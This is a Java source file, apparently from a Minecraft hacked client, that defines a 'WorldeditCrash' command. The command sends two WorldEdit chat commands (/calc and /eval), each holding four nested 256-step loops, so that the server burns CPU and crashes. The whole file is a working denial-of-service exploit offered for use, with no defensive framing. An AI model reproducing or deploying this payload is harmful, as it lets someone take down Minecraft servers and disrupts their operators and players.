package de.javafunction.meta.command.commands;

import de.javafunction.meta.command.Command;
import de.javafunction.meta.utils.ChatUtil;

import java.util.List;

public class WorldEditCrashCommand extends Command {
    public WorldEditCrashCommand() {
        super("WorldeditCrash", "wecrash", "wecrash", "WorlEdit Crasher", null);
    }

    @Override
    public void onCommand(List<String> args) {
        ChatUtil.ClientMessage("§6Started WorlEdit Crash!");
        ChatUtil.Command("worldedit:/calc for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}");
        ChatUtil.Command("/eval for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){sin(n)}}}}");
    }
}
